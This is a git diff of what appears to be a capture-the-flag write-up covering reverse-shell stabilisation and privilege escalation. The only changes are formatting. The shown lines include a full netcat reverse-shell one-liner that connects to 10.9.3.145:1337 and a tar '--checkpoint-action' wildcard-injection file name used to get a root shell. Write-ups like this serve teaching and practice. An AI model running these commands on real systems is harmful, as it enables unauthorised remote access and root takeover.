@@ -47,6 +47,7 @@ we have our sweet reverse shell. so, stabilize it
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c3f9e157-3537-45e9-a1d4-35b28bc19cc8)
  so, we can see our privilege is limited
  let's try escalating privilege
+
  ## Privilege escalation
 
    Uploading linpeas on the box 
@@ -70,7 +71,7 @@ we have our sweet reverse shell. so, stabilize it
 The name of the attack is Wildcard injection, and it's a way to make tar run an executable for us. Since the backup service is running as root, if we make this executable a reverse shell, then we got ourselves a root shell. 
 set your netcat listener.
 
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f" > shell.sh
+```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f" > shell.sh```
 
 ```2. echo ""> "--checkpoint-action=exec=sh shell.sh"```
 
